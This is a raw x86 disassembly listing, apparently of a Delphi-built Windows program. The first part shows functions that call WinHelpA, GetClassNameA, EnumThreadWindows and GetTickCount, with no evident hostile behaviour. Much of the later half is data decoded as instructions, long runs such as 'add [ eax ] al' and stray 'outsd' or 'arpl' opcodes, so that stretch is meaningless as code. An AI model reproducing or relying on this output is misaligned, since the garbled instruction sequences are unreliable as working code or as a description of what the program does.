xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444151
lea eax [ ebp - 0x110 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041c0
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_44443c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4041c0
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_444168
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4441ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441d1
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_443ba0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_4441dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44425c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_443ba0
mov eax ebx
call sub_4444e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444263
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_44443c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44426c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_444357
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4444e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44435e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f74
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408080
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_44443c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408080
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403fa4
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_443ba0
mov eax [ ebp - 0x14 ]
call sub_404410
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_44436c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408818
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_4443c7
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087f4
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_44443c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_4444b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_444420
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444b9
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407da8
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_4444c8
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4444e4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_444420
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_4444c4
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_4444c8
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_444540
sub_444540
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4445bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_443fa0
call GetTickCount
mov ebx eax
push 0x0
call sub_40637c
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_443ba0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4445c4
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404410
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4445cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4034a0
call sub_4057d4
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_444614
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_444640
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4446ae
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4446b5
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4057bc
mov eax rw-data
call sub_4057bc
mov eax rw-data
call sub_4057bc
mov eax rw-data
call sub_403f50
mov eax rw-data
call sub_4057bc
mov eax [ rw-data ]
call sub_443c70
sub_4446b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44470a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444711
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4445cc
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4057bc
mov edx eax
mov eax [ rw-data ]
call sub_42ade8
sub_4448f4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x40004449
add [ eax ] al
add [ eax + ecx * 2 ] ch
inc esp
add [ ebx + esi + 0x740c0040 ] al
inc esp
add ah bh
jae r-xdata
jb r-xdata
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax - 0x33ffbb8c ] bl
je r-xdata
inc esp
add ah ah
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add ah ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40004472 ] cl
je r-xdata
jae r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x38 ] si
dec ecx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40004472 ] cl
je r-xdata
add al ch
jbe r-xdata
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x44 ] cl
add al dh
je r-xdata
add [ edx + ecx * 2 + 0x700044 ] dl
add [ eax ] dl
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x44 ] cl
add al dh
je r-xdata
rcr [ ebx + ecx * 2 ] 0x44
add ah bh
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 4 + 0x4a ] si
add [ eax ] dl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x75100044 ] ah
inc esp
add [ eax ] al
sub al 0x48
inc esp
add [ ebx + esi + 0x740c0040 ] al
inc esp
add ah bh
jae r-xdata
add [ eax ] dh
add [ esp + esi * 2 + 0x44 ] ch
add [ esp + esi * 2 ] bl
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
add ah dh
dec ecx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x75100044 ] ah
inc esp
add [ esp + esi * 2 + 0x44 ] ch
add [ esp + esi * 2 ] bl
inc esp
add [ edx ] dl
push esp
inc esp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
mov eax 0x444b
add [ eax ] al
add [ eax ] dl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4b ] bl
inc esp
add [ eax ] dh
add [ edi + esi * 2 ] bl
inc esp
add [ edi ] cl
push esp
inc esp
jb r-xdata
add [ ebx + esi * 2 + 0x76240044 ] ch
inc esp
add [ esi * 2 + 0x766c0044 ] dh
inc esp
add al ch
jbe r-xdata
outsd
insb
jae r-xdata
je r-xdata
add [ ebx + esi * 2 + 0x72880044 ] al
inc esp
add al cl
jne r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
je r-xdata
add [ ebx + esi * 2 + 0x72880044 ] al
inc esp
add al cl
jne r-xdata
inc esp
add [ ebx + esi + 0x740c0040 ] al
inc esp
add [ edi + esi * 2 ] ah
inc esp
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x67ffbb8b ] bl
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ eax + 0x2d ] dl
inc edx
add ah bh
jbe r-xdata
add [ ebx + 0x444b1cc0 ] cl
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x67ffbb8b ] bl
je r-xdata
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
dec edx
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
inc esp
add [ edx + esi * 2 + 0x44 ] cl
add [ eax - 0x5bffbb8d ] ah
jae r-xdata
jae r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
pop eax
dec edx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] cl
xor [ eax ] eax
hlt
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
dec ebx
add [ edx + esi * 2 + 0x44 ] cl
add [ eax - 0x5bffbb8d ] ah
jae r-xdata
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
add [ edi + esi * 2 ] bl
inc esp
add [ ecx ] dl
push esp
inc esp
jb r-xdata
inc esp
add [ eax + ecx * 2 + 0x44 ] bh
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ebx + esi * 2 + 0x76240044 ] ch
arpl [ eax + ebx * 2 + 0x4a ] si
inc esp
add [ esi * 2 + 0x766c0044 ] dh
inc esp
add [ ebx + esi * 2 + 0x73ac0044 ] ah
inc esp
add [ esi + esi * 2 ] ah
add [ eax ] al
or al 0x4a
inc esp
sar [ eax + 0x444b ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
dec ebx
inc esp
add [ eax + eax ] ah
inc ecx
add [ ebx + ecx * 4 + 0x51140041 ] ch
inc esp
outsd
arpl [ ebx + 0x4f ] bp
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] ch
sbb [ edx ] al
mov eax [ fs : eax + eax + 0x5c ]
sbb [ edx ] al
test [ ebp + 0x18900044 ] cl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
jae r-xdata
inc esp
add [ edx + 0x45 ] bh
add ah ah
mov [ eax + eax - 0x5c ] es
bound eax [ ebp ]
mov eax 0x5c004562
mov es [ eax + eax + 0x18 ]
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x38 ]
arpl [ ebp ] ax
int3
inc edx
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
inc edx
add [ eax + ebx + 0x42 ] dh
add al cl
sbb [ edx ] al
jo r-xdata
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
jae r-xdata
add [ ebp + 0x4c580040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
dec esp
inc esp
add [ eax + eax ] bl
add [ eax ] al
xor al 0x5c
inc ebp
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x4b
add [ eax ] al
in al 0x4b
inc esp
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp + ecx * 4 + 0x18900044 ] al
inc edx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
sub [ eax ] bl
inc edx
add [ ebx + ecx * 4 + 0x44 ] ah
add [ eax + ebx + 0x42 ] bl
jae r-xdata
inc edx
add [ eax ] al
push ecx
inc edx
add [ eax ] ah
mov [ eax + eax + 0xe ] eax
push esp
inc ebx
outsd
outsb
je r-xdata
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah dh
mov [ eax + eax - 0x70 ] al
mov [ ecx ] es
cwde
mov [ ecx ] es
lodsb [ esi ]
mov eax [ ecx ]
adc al 0x51
dec ebx
inc esp
add [ ebp + ebp + 0x40042 ] bh
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
add [ eax - 0x74 ] dh
outsd
insb
sub_4458cc
inc esp
add [ eax ] al
mov dh 0x44
add [ eax - 0x4a ] dl
inc esp
add [ esi * 4 - 0x49d7ffbc ] cl
inc esp
add [ eax - 0x4a ] bh
inc esp
add al dl
mov dh 0x44
add [ eax + 0x300044b7 ] bh
mov eax 0xb8500044
inc esp
add [ eax - 0x48 ] dh
inc esp
add al cl
mov eax 0xb9080044
inc esp
add [ eax - 0x1fffbb47 ] bh
mov ecx 0xb9e80044
inc esp
add al dh
mov ecx 0xbaf00044
inc esp
add [ eax ] ah
mov ebx 0xb9f80044
inc esp
add al cl
mov edx 0xc16c0044
inc esp
add [ ebx + edi * 4 + 0x44 ] al
add [ ebx + edi * 4 + 0x44 ] cl
add [ ebx + edi * 4 + 0x44 ] ah
add [ ebx + edi * 4 + 0x44 ] bh
add [ esp + edi * 4 - 0x4557ffbc ] dl
inc esp
add [ eax ] ch
mov edx 0xba4c0044
inc esp
add [ eax - 0xbffbb3f ] bl
mov esp 0xc0e00044
inc esp
add [ eax + 0x3c0044a4 ] dh
0xb35c0044 0x44
int3
sub_445b50
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x5c
outsd
outsb
je r-xdata
inc esp
add [ edx + 0x45 ] bh
add ah ah
mov [ eax + eax - 0x5c ] es
bound eax [ ebp ]
cmp ah al
add [ eax + ebx + 0x42 ] dh
add al cl
sbb [ edx ] al
jo r-xdata
js r-xdata
inc esp
add [ esi + ecx * 4 + 0x44 ] bl
add [ eax ] bl
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x38 ]
arpl [ ebp ] ax
int3
in al 0x8c
inc esp
add [ edx - 0x3bc7ffbb ] ah
inc esp
add [ eax + eax ] ah
add [ eax ] al
or al 0x4c
inc esp
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
sub [ eax ] bl
inc edx
add [ esp + eax * 8 ] dl
inc esp
add [ eax + ebx + 0x42 ] bl
add [ ebp + ecx * 4 + 0x18900044 ] al
inc edx
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
inc edx
cwde
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 2 ] dl
sub_44603e
add al 0xeb
inc esp
add [ eax ] ch
jmp r-xdata
add [ eax - 0x5bffbaec ] ah
stc
inc esp
add al al
stc
inc esp
add [ eax ] dh
adc eax 0xfa3c0045
inc esp
add [ eax - 0x6 ] ah
inc esp
add [ edx + ebp * 8 + 0x44 ] ch
add [ eax - 0x6fffbb16 ] al
0xee500044 0x44
sub_446051
add [ eax + 0x80044ec ] bh
in eax dx
inc esp
add [ ebp * 8 - 0x12afffbc ] bh
inc esp
add al bl
cmc
inc esp
add [ esi + esi * 8 ] al
inc esp
add al al
test [ eax + eax - 0x20 ] 0xf6
inc esp
add [ edi + esi * 8 - 0x7abffbc ] al
inc esp
add ah bh
clc
inc esp
add [ ecx + edi * 8 ] bl
inc esp
add [ eax - 0x7 ] dl
inc esp
add [ eax - 0x7 ] dh
inc esp
add [ eax - 0x5bffbaec ] ah
stc
inc esp
add al al
stc
inc esp
add [ eax ] dh
adc eax 0xfa3c0045
inc esp
add [ eax - 0x6 ] ah
inc esp
add [ edx + ebp * 8 + 0x44 ] ch
add [ eax - 0x6fffbb16 ] al
0xee500044 0x44
sub_4466fd
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_4467b4
xchg esp eax
inc esp
add [ esi - 0x57ffbb99 ] bl
inc esp
add [ ecx ] bl
inc esp
add [ ecx ] ah
inc esp
add [ ecx ] ch
inc esp
add [ ecx ] dh
inc esp
add [ esi ] bh
inc esp
add [ ebx + 0x67 ] cl
inc esp
add [ eax + 0x67 ] bl
inc esp
add [ ebp + 0x67 ] ah
inc esp
add [ edx + 0x67 ] dh
inc esp
add [ edi + 0x67 ] bh
inc esp
add [ edi + 0x10044 ] cl
add [ eax ] al
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x67b4e870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x68 ] bl
inc esp
add ah ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 + 0x780044 ] al
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
test [ ebx ] dh
inc eax
add [ eax + ebx * 2 ] bh
inc eax
add [ eax + 0x58 ] cl
inc eax
add [ eax - 0x73ffbfcd ] bl
xor eax [ eax ]
pop eax
pop eax
inc eax
add [ eax ] cl
xor [ eax ] eax
cld
sub al 0x45
add [ eax + 0x2d ] dl
inc ebp
add al cl
inc ebp
add al bl
inc ebp
add [ eax - 0x7fffbaca ] bl
cmp [ ebp ] eax
sar [ ebx ] 0x45
add ah al
cmp eax 0x42c80045
inc ebp
add [ eax + eax * 2 + 0x45 ] bh
add [ ebx + ebp + 0x3a5c0045 ] dl
inc ebp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
cmp [ edx + 0x44 ] ch
mov eax eax
fsubr [ eax + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
push 0x280044
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
mov al 0x4f
inc ebp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax - 0x3c ] cl
inc esp
add [ ecx + 0x12200045 ] al
inc ebp
adc al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push 0x44
add [ eax ] cl
add al [ eax ]
add [ eax ] ah
pop esi
inc esp
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
nop
xor [ ecx + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
push 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add al al
push esi
inc ebp
add [ eax + 0x29 ] cl
inc eax
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
nop
je r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
xor eax [ eax ]
xchg esp eax
inc eax
add [ eax - 0x67ffbdf0 ] dl
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add al al
push esi
inc ebp
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ 0x73754354 ] bl
je r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
loop r-xdata
insb
nop
cmp [ edx + 0x44 ] ch
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
or al 0x48
insd
dec ebp
jne r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
add [ edx + ebx * 8 + 0x44 ] bl
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
